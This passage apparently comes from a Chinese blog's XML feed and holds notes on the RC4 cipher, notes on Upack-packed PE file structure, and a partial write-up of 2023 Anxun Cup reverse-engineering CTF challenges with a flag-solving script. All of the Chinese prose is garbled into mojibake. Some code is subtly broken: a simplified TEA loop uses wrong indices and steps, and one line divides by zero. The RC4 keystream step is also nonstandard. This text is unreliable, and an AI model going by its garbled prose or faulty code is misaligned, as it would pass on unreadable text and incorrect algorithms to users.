        <content type="html"><![CDATA[<h1>Rivest Cipher 4</h1><h2 id="æ€§è´¨">æ€§è´¨</h2><p>ä¸²æµåŠ å¯†ï¼Œå¯†é’¥é•¿åº¦å¯å˜ï¼Œå¯¹ç§°åŠ å¯†ï¼ŒåŠ å¯†è§£å¯†ä½¿ç”¨åŒä¸€å¥—ç®—æ³•</p><ul><li>ä¸²æµåŠ å¯†ï¼šå³å¯†é’¥æ˜¯é€šè¿‡ä¸€ä¸ªéšæœºç§å­é€šè¿‡ç®—æ³•å¾—åˆ°çš„ä¼ªéšæœºå¯†é’¥æµï¼Œç”¨è¿™ä¸€ä¸²å¯†é’¥åŠ å¯†æˆ–è§£å¯†ã€‚ä½¿åŠ å¯†è¿‡ç¨‹æœ‰å®Œå–„ä¿å¯†æ€§ï¼ˆå¯†é’¥é•¿åº¦ä¸çŸ­äºæ˜æ–‡é•¿åº¦ï¼‰</li><li>å¯¹ç§°åŠ å¯†ï¼šåŠ å¯†è§£å¯†åŒæ–¹ä½¿ç”¨åŒä¸€ä¸ªå¯†é’¥åŠ å¯†è§£å¯†æˆ–åŒæ–¹ä½¿ç”¨çš„æ˜¯ä¸¤ä¸ªå¯ä»¥ç®€å•åœ°ç›¸äº’æ¨ç®—çš„å¯†é’¥</li><li>åŠ å¯†è§£å¯†ä½¿ç”¨åŒä¸€å¥—ç®—æ³•ï¼šRC4ä¸€èˆ¬ä½¿ç”¨å¼‚æˆ–åŠ å¯†ï¼Œç”±äºå¼‚æˆ–çš„å¯¹åˆæ€§ï¼ˆ$f(f(x))=x$,å¯¹ä»»æ„xå‡æˆç«‹ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨ç›¸åŒç®—æ³•åŠ å¯†</li></ul><hr><h2 id="è¿‡ç¨‹">è¿‡ç¨‹</h2><h3 id="åˆå§‹åŒ–ï¼ˆKSAï¼‰">åˆå§‹åŒ–ï¼ˆKSAï¼‰</h3><ol><li><p>åˆå§‹åŒ–Sç›’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    S.append(i)</span><br></pre></td></tr></table></figure></li><li><p>æ‰“ä¹±Sç›’(è¿™ä¸ªç®—æ³•å¯ä»¥ä¿è¯æ¯ä¸€é¡¹éƒ½è¢«æ¢è¿‡)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">key = ...</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">    swap(S[i],S[j])</span><br></pre></td></tr></table></figure></li></ol><h3 id="ä¼ªéšæœºå­å¯†ç ç”Ÿæˆï¼ˆPRGAï¼‰">ä¼ªéšæœºå­å¯†ç ç”Ÿæˆï¼ˆPRGAï¼‰</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">    i,j = (i+<span class="number">1</span>)%<span class="number">256</span>,(j+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">    swap(S[i],S[j])</span><br><span class="line">    c = m[i] ^ S[(S[i] + S[j]) % <span class="number">256</span>]</span><br></pre></td></tr></table></figure><p>æ³¨ï¼šæœ€åçš„ç®—æ³•ä¸ä¸€å®šæ˜¯æ ‡å‡†çš„ï¼Œä½†æ˜¯åªè¦æ˜¯åŸæ–‡å’Œä¸€ä¸ªåœ¨è¿‡ç¨‹ä¸­äº§ç”Ÿçš„å€¼å¼‚æˆ–ï¼Œå°±å¯ä»¥ç®—ä½œRC4ã€‚</p><hr><h2 id="ç ´è§£æ–¹æ³•">ç ´è§£æ–¹æ³•</h2><h3 id="ç¼ºé™·">ç¼ºé™·</h3><p>[ç­‰å¾…æ–½å·¥][QAQ]</p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å­¦ </category>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç  </tag>
            
            <tag> åŠ å¯†æ–¹æ³• </tag>
            
            <tag> å¯¹ç§°åŠ å¯† </tag>
            
            <tag> æµåŠ å¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šé€†æ ¸ã€‹05-Upackå’ŒPEç»“æ„</title>
      <link href="/posts/65cde422.html"/>
      <url>/posts/65cde422.html</url>
      
        <content type="html"><![CDATA[<p>upackæ˜¯ä¸€ä¸ªå‹ç¼©å™¨ï¼Œç”¨äºå‹ç¼©PEæ–‡ä»¶,è·Ÿéšé€†æ ¸ä¸€èµ·æ·±å…¥å­¦ä¹ PEæ–‡ä»¶ç»“æ„</p><h1>ç‰¹å¾</h1><p>PEæ–‡ä»¶ç»è¿‡upackä¹‹åæœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p><h2 id="é‡å æ–‡ä»¶å¤´">é‡å æ–‡ä»¶å¤´</h2><ul><li><p>æŠŠMZæ–‡ä»¶å¤´(doså¤´)å’ŒPEå¤´é‡åˆåœ¨ä¸€èµ·</p></li><li><p>åŸç†æ˜¯doså¤´ä¸­çš„e_lfanewæŒ‡å‘NTå¤´ä½†æ˜¯å¹¶æ²¡æœ‰è¯´NTå¤´ä¸èƒ½å’ŒDOSå¤´é‡åˆ,ä¸€èˆ¬æƒ…å†µä¸‹:</p></li><li><pre><code>e_fanew = MZæ–‡ä»¶å¤§å°(40h)+DOSå­˜æ ¹=E0<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ä½†æ˜¯Upackåe_fanewå€¼æ˜¯<span class="number">10</span><span class="built_in">h</span>,æ‰€ä»¥hexæ–¹å¼æ‰“å¼€å,ç¬¬ä¸€æ’æ˜¯<span class="number">4</span>D5Aä¸‹ä¸€æ’å°±æ˜¯<span class="number">5045</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## åœ¨å¯é€‰å¤´ä¸­æ’å…¥è§£ç ä»£ç </span></span><br><span class="line"></span><br><span class="line">- ä¿®æ”¹SizeOfOpionalHeaderçš„å€¼å¢åŠ è‡³<span class="number">148</span><span class="built_in">h</span>ï¼Œè¿™æ ·åœ¨èŠ‚åŒºå¤´å’Œå¯é€‰å¤´ä¸­é—´å°±å¯ä»¥æ’å…¥è§£ç ä»£ç ï¼Œæ­¤æ—¶èŠ‚åŒºå¤´çš„èµ·å§‹åç§»æ˜¯</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  <span class="number">170</span><span class="built_in">h</span>=<span class="number">28</span><span class="built_in">h</span>(å¯é€‰å¤´èµ·å§‹åç§»)+<span class="number">148</span><span class="built_in">h</span></span><br></pre></td></tr></table></figure></code></pre></li><li><p>(SizeOfOpionalHeaderçš„ä½œç”¨æ˜¯æƒ³è¦æ ¹æ®PEæ–‡ä»¶å½¢æ€æ›´æ¢å’Œæ’å…¥å…¶å®ƒå¯é€‰å¤´å½¢æ€çš„ç»“æ„ä½“)</p></li></ul><h2 id="åœ¨æ–‡ä»¶å¤´æ’å…¥è§£ç ä»£ç ">åœ¨æ–‡ä»¶å¤´æ’å…¥è§£ç ä»£ç </h2><ul><li>å¯é€‰å¤´ä¸­çš„NumberOfRvaAndSizesç”±10hå˜ä¸ºAh,ä½¿å¾—DataDirectoryåªæœ‰å‰10ä¸ªå…ƒç´ ,å¹¶æŠŠåé¢6ä¸ªå…ƒç´ çš„ä½ç½®æ”¹ä¸ºè‡ªå·±çš„è§£ç ä»£ç </li></ul><h2 id="åœ¨èŠ‚åŒºå¤´ä¸­è®°å½•è‡ªèº«æ•°æ®å’Œé‡å èŠ‚åŒº">åœ¨èŠ‚åŒºå¤´ä¸­è®°å½•è‡ªèº«æ•°æ®å’Œé‡å èŠ‚åŒº</h2><ul><li>èŠ‚åŒºå¤´ä¸­ç±»ä¼¼é‡å®šä½èŠ‚åŒºæ˜¯ä¸éœ€è¦çš„,æ‰€ä»¥è¿™ç§èŠ‚åŒºå¯ä»¥ç”¨äºè®°å½•è‡ªèº«æ•°æ®</li><li>æ•´ä¸ªPEæ–‡ä»¶åˆ†ä¸º4ä¸ªéƒ¨åˆ†:PEå¤´,ç¬¬ä¸€èŠ‚åŒº,ç¬¬äºŒèŠ‚åŒº,ç¬¬ä¸‰èŠ‚åŒº.æœ‰ä»¥ä¸‹å‡ ä¸ªç‰¹æ€§:</li><li>å†…å­˜ä¸­,PEå¤´,ç¬¬ä¸€èŠ‚åŒº,ç¬¬ä¸‰èŠ‚åŒºå‡ç”±åŒä¸€åŒºåŸŸæ˜ å°„è€Œæ¥,å³SizeOfRawDataå’ŒRawOffsetç›¸åŒ,ä½†æ˜¯VirtulSizeä¸åŒ<ul><li>æºæ–‡ä»¶å‹ç¼©äºç¬¬äºŒèŠ‚åŒº</li><li>ç¬¬ä¸€èŠ‚åŒºçš„SizeOfImageä¸åŸPEæ–‡ä»¶ç›¸åŒ,å³åŸPEæ–‡ä»¶ä¼šè§£å‹åˆ°ç¬¬ä¸€èŠ‚åŒº</li></ul></li></ul><hr><h2 id="RVA-to-RAW">RVA to RAW</h2><p>æ ‡å‡†æ“ä½œæ˜¯:</p><p><code>RAW=RVA-VA+PointerToRawData</code></p><p>ä½†æ˜¯ç»è¿‡upackå,ç¬¬ä¸€èŠ‚åŒºçš„PointerToRawDataå€¼ä¸º10,ç„¶è€Œä¸ä¸ºFileAlignment(200h)çš„å€æ•°,å› æ­¤PEè£…è½½å™¨å¼ºåˆ¶è¯†åˆ«ä¸ºå…¶æ•´å€æ•°(ç¡®ä¿æŒ‡å‘ä¸€é¡µ),ä»¤å…¶ç­‰äº0</p><p>æ‰€ä»¥æ­£ç¡®å€¼æ˜¯:</p><p><code>RAW=RVA-VA</code></p><h2 id="å¯¼å…¥è¡¨">å¯¼å…¥è¡¨</h2><ul><li>é€šè¿‡å­˜åœ¨åœ¨èŠ‚åŒºçš„æœ«å°¾,çœç•¥æœ€åçš„nullç»“æ„ä½“,æ˜ å°„åˆ°å†…å­˜æ—¶,åé¢è‡ªç„¶æœ‰nullå¡«å……,è¿™æ ·å¯ä»¥èŠ‚çº¦ç©ºé—´</li></ul><h2 id="å¯¼å…¥åœ°å€è¡¨">å¯¼å…¥åœ°å€è¡¨</h2><ul><li>åœ¨DOSå­˜æ ¹ä¸­å­˜æ”¾å¯¼å…¥DLLçš„åç§°,æŸ¥çœ‹FirstThunkå¯ä»¥æ‰¾åˆ°å¯¹åº”åŠ è½½çš„å‡½æ•°.</li></ul><hr><h1>è°ƒè¯•è¿‡ç¨‹</h1><ul><li>å…ˆæ˜¯è§£ç å¾ªç¯,å†æ˜¯è®¾ç½®IAT(å’ŒUPXå·®ä¸å¤š?),ä½†æ˜¯è®¾ç½®IATçš„æ–¹æ³•æ˜¯ç”¨å¯¼å…¥çš„å‡½æ•°LoadLibraryAå’ŒGetProcAddressä¸€è¾¹å¾ªç¯ä¸€éæ„å»º(å…ˆè·å–å¯¼å…¥å‡½æ•°å®é™…åœ°å€,å†å†™å…¥åŸå‡½æ•°)IAT</li></ul>]]></content>
      
      
      <categories>
          
          <category> é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
            <tag> å­¦ä¹  </tag>
            
            <tag> å£³ </tag>
            
            <tag> PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023å®‰æ´µæ¯REéƒ¨åˆ†å¤ç°</title>
      <link href="/posts/a04e3508.html"/>
      <url>/posts/a04e3508.html</url>
      
        <content type="html"><![CDATA[<h1>å®‰æ´µæ¯RE</h1><h2 id="mobilego">mobilego</h2><p>ç°åœ¨æ¨¡æ‹Ÿå™¨ä¸­å°è¯•è¾“å…¥ï¼Œè¿”å›nonono</p><p>jadxæ‰“å¼€mainactivity</p><p>å‘ç°åˆ¤æ–­å‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="comment">/* synthetic */</span> <span class="keyword">void</span> m141lambda$onCreate$<span class="number">0</span>$comexamplemobilegoMainActivity(View v) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Game.checkflag(<span class="built_in">this</span>.editText.getText().toString()).equals(getResources().getString(C0569R.string.cmp))) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;yes your flag is right&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;No No No&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨C0569Rä¸­æœ‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">string</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">app_name</span> <span class="operator">=</span> <span class="number">2131689500</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">cmp</span> <span class="operator">=</span> <span class="number">2131689512</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„cmpæ˜¯å®ƒçš„idå€¼è€Œä¸æ˜¯å®ƒçš„å…·ä½“å€¼</p><p>æ‰€ä»¥åŠ¨æ€è°ƒè¯•æ‰¾åˆ°ç»ˆå€¼</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">49021</span>&#125;<span class="number">5</span>f919038b440139g74b7Dc88330e5d&#123;<span class="number">6</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨äº†Game.checkflagè¿™ä¸ªæ–¹æ³•æ¥åŠ å¯†</p><p>æ‰€ä»¥å…ˆçœ‹è¿™ä¸ª</p><p>æ ¹æ®game</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> game;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> p004go.Seq;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Game</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">_init</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">checkflag</span><span class="params">(String str)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        Seq.touch();</span><br><span class="line">        _init();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Game</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">touch</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€€ç–‘checkflagæ˜¯é€šè¿‡libåŠ è½½çš„</p><p>æ‰“å¼€idaï¼Œåæ±‡ç¼–soæ–‡ä»¶</p><p>æœç´¢checkflag</p><p>æ‰¾åˆ°5ä¸ªå‡½æ•°</p><p><img src="https://s2.loli.net/2023/12/28/Z4TbAVSxCklJaOB.png" alt="image-20231228150946781"></p><p>å‡½æ•°æ˜¯è¿™å‡ ä¸ª</p><p>å¥½å¤æ‚ï¼Œçœ‹ä¸æ‡‚ã€‚ã€‚</p><p>æœ€åçœ‹äº†çœ‹wpï¼Œå‘ç°ä¸€ä¸ªä¸€ç›´æ²¡æ³¨æ„çš„ä¸œè¥¿ï¼Œå¦‚æœè¾“å…¥</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1234567890</span>å˜ä¸º<span class="number">6143580927</span>ï¼Œ</span><br><span class="line">&#123;qwertyuiopasdfghjklzxcvbnm&#125;å˜ä¸ºbhgsruc&#123;iojqkdpwnezyvxa&#125;lfmt</span><br></pre></td></tr></table></figure><p>è¯´æ˜è¿™ä¸ªåŠ å¯†åªæ˜¯å­—ç¬¦äº¤æ¢ï¼Œäº¤æ¢ä¹‹åæ˜¯</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">49021</span>&#125;<span class="number">5</span>f919038b440139g74b7Dc88330e5d&#123;<span class="number">6</span></span><br></pre></td></tr></table></figure><p>ä¸€å…±38ä¸ªå­—ç¬¦</p><p>é‚£ä¹ˆå°è¯•è¾“å…¥ä¸€ä¸ªä¸é‡å¤çš„å€¼ï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥æ‰¾åˆ°æ˜ å°„è¡¨ï¼š</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t<span class="number">2</span>F<span class="number">7</span>GTglISYL<span class="symbol">nMzc6</span>CqhD<span class="symbol">N5</span>OdX<span class="number">8</span>wPjsKufVbE&#125;</span><br></pre></td></tr></table></figure><p>å˜ä¸º</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NVLjz&#125;ShscYPndXT62qlDFO5I8tgEKw7ufbMGC</span><br></pre></td></tr></table></figure><p>æ ¹æ®è¿™ä¸ªå¯¹åº”å…³ç³»ï¼Œé€†å‘è§£å‡ºåŸæ¥çš„å…³ç³»</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">d1 = <span class="string">&#x27;t2F7GTglISYLnMzc6CqhDN5OdX8wPjsKufVbE&#125;&#x27;</span></span><br><span class="line">d2 = <span class="string">&#x27;NVLjz&#125;ShscYPndXT62qlDFO5I8tgEKw7ufbMGC&#x27;</span></span><br><span class="line"></span><br><span class="line">f2 = <span class="string">&#x27;49021&#125;5f919038b440139g74b7Dc88330e5d&#123;6&#x27;</span></span><br><span class="line">f1 = [<span class="number">0</span>]*<span class="number">38</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">        <span class="keyword">if</span> (d2[j] == d1[i]):</span><br><span class="line">            f1[i] = f2[j]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(f1))</span><br><span class="line"><span class="comment">#D0g3&#123;4c3b5903d11461f94478b7302980e958&#125;</span></span><br></pre></td></tr></table></figure><p>æ€»ç»“ï¼š</p><p>çŒœæµ‹è¾“å…¥æ—¶å°½é‡ä½¿ç”¨æœ‰è§„å¾‹çš„å­—ç¬¦ï¼Œæ›´å®¹æ˜“çœ‹æ¸…</p><p>å¦‚æœä¸å®¹æ˜“é€†å‘å¯ä»¥å°è¯•çœ‹æˆ–è€…çŒœ</p><hr><h2 id="ç‰¢å¤§æƒ³ä½ äº†">ç‰¢å¤§æƒ³ä½ äº†</h2><p>ç”¨dnspyæ‰“å¼€Assembly-CSharp.dllåï¼Œå¯ä»¥çœ‹åˆ°ä¸»å†…å®¹ä¸­ä¸åŒç±»ï¼ˆæ²¡å­¦è¿‡csharpï¼ŒçŒœçš„ï¼‰ï¼Œæ˜¯ä»¥ä¸‹å‡ ä¸ªç±»ï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">AABAAABABABAAABBABBABAAAABBAABBAABABBBBBABAAAB</span></span><br><span class="line"><span class="attribute">ABBBBABABBAABABBBBBABBBBABABBBAAAABBBAABBBAABBA</span></span><br><span class="line"><span class="attribute">BBBBAAABABABABAAABABBBBBAAABBBAAAAABBBBAABAAABB</span></span><br><span class="line"><span class="attribute">GameManager</span></span><br><span class="line"><span class="attribute">UIManager</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä¸‰ä¸ªçš„å˜é‡åå’Œç±»åéƒ½è¢«æ··æ·†äº†ï¼Œéœ€è¦å…ˆæ ¹æ®å­—ç¬¦ä¸²æ‰¾åˆ°é€»è¾‘ä»£ç </p><p>åœ¨GameManageræ‰¾åˆ°å¤šä¸ªï¼š</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (<span class="name">array</span>.*SequenceEqual*(<span class="name">encryptedData</span>))</span><br><span class="line">if (<span class="name">array</span>.*SequenceEqual*(<span class="name">encryptedData</span>))</span><br><span class="line">if (<span class="name">array</span>.*SequenceEqual*(<span class="name">encryptedData</span>))</span><br><span class="line">if (<span class="name">array</span>.*SequenceEqual*(<span class="name">encryptedData</span>))</span><br></pre></td></tr></table></figure><p>åŒæ—¶åœ¨è¿™ä¸ªè¯­å¥ä¸Šé¢å‡æœ‰</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RuntimeHelpers.InitializeArray(array, fieldof(&lt;PrivateImplementationDetails&gt;.BC42CACDF93A0A1981A27121FBDC9584A9570918).FieldHandle);</span><br></pre></td></tr></table></figure><p>ç›¸å½“äºå…ˆæŠŠarrayå…ˆåˆå§‹åŒ–ä¸ºBC42CACDF93A0A1981A27121FBDC9584A9570918çš„å€¼ï¼Œè¿™ä¸ªå­—ç¬¦ä¸æ˜¯å€¼è€Œæ˜¯ç±»ä¼¼äºå˜é‡åçš„ä¸œè¥¿</p><p>æ‰€ä»¥æ‰“å¼€çœ‹çœ‹</p><p>ç»“æœå‘ä¸‹çœ‹å‘ç°ç›´æ¥å°±æœ‰arrayçš„å€¼ï¼Œè¿™æ ·æœ«å€¼å°±æœ‰äº†</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uint</span>[] array = <span class="keyword">new</span> <span class="built_in">uint</span>[]</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">3363017039U</span>,</span><br><span class="line"><span class="number">1247970816U</span>,</span><br><span class="line"><span class="number">549943836U</span>,</span><br><span class="line"><span class="number">445086378U</span>,</span><br><span class="line"><span class="number">3606751618U</span>,</span><br><span class="line"><span class="number">1624361316U</span>,</span><br><span class="line"><span class="number">3112717362U</span>,</span><br><span class="line"><span class="number">705210466U</span>,</span><br><span class="line"><span class="number">3343515702U</span>,</span><br><span class="line"><span class="number">2402214294U</span>,</span><br><span class="line"><span class="number">4010321577U</span>,</span><br><span class="line"><span class="number">2743404694U</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">c</span><span class="number">873914</span>f<span class="punctuation">,</span></span><br><span class="line"><span class="number">4</span>a<span class="number">628600</span><span class="punctuation">,</span></span><br><span class="line"><span class="number">20</span><span class="keyword">c</span><span class="number">77</span>a<span class="number">1</span><span class="keyword">c</span><span class="punctuation">,</span></span><br><span class="line"><span class="number">1</span>a<span class="number">877</span>aaa<span class="punctuation">,</span></span><br><span class="line">d<span class="number">6</span>faa<span class="number">982</span><span class="punctuation">,</span></span><br><span class="line"><span class="number">60</span>d<span class="number">1</span><span class="keyword">c</span><span class="number">964</span><span class="punctuation">,</span></span><br><span class="line">b<span class="number">9884</span><span class="keyword">c</span><span class="number">32</span><span class="punctuation">,</span></span><br><span class="line"><span class="number">2</span>a<span class="number">08</span>a<span class="number">862</span><span class="punctuation">,</span></span><br><span class="line"><span class="keyword">c</span><span class="number">74</span>a<span class="number">0036</span><span class="punctuation">,</span></span><br><span class="line"><span class="number">8</span>f<span class="number">2</span>ee<span class="number">196</span><span class="punctuation">,</span></span><br><span class="line">ef<span class="number">08</span>a<span class="number">6</span>a<span class="number">9</span><span class="punctuation">,</span></span><br><span class="line">a<span class="number">3850896</span></span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯æ‰¾åŠ å¯†å‡½æ•°å³encryptedDataçš„æ¥æº</p><p>åœ¨ä¸Šé¢ä¸€è¡Œï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Buffer.BlockCopy(paddedArray, <span class="number">0</span>, uintArray, <span class="number">0</span>, paddedArray.Length);</span><br><span class="line"><span class="built_in">uint</span>[] encryptedData = <span class="keyword">new</span> <span class="built_in">uint</span>[<span class="number">0</span>];</span><br><span class="line">AAABAAABABABAAABBABBABAAAABBAABBAABABBBBBABAAAB str2 = <span class="keyword">new</span> AAABAAABABABAAABBABBABAAAABBAABBAABABBBBBABAAAB(str);</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; uintArray.Length; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">encryptedData = encryptedData.Concat(str2.BABBBBBBAAAAAABABBBAAAABBABBBAABABAAABABBAAABBA(uintArray[i], uintArray[i + <span class="number">1</span>])).ToArray&lt;<span class="built_in">uint</span>&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BABBBBBBAAAAAABABBBAAAABBABBBAABABAAABABBAAABBAæ˜¯ä¸€ä¸ªæ–¹æ³•ï¼Œé‚£ä¹ˆåŒ–ç®€ä¸€ä¸‹æ–¹æ³•åï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; uintArray.Length; i += <span class="number">7</span>)</span><br><span class="line">&#123;</span><br><span class="line">encryptedData = encryptedData.Concat(str2.tea(uintArray[i], uintArray[i + <span class="number">0</span>])).ToArray&lt;<span class="built_in">uint</span>&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ååˆ†æ˜æ˜¾äº†ï¼ŒuintArrayæ˜¯è¾“å…¥ï¼Œå®šä¹‰æ˜¯</p><p>uint[] uintArray = new uint[paddedArray.Length / 0];</p><p>str2åœ¨å‰é¢æ˜¯</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAABAAABABABAAABBABBABAAAABBAABBAABABBBBBABAAAB str2 = <span class="keyword">new</span> 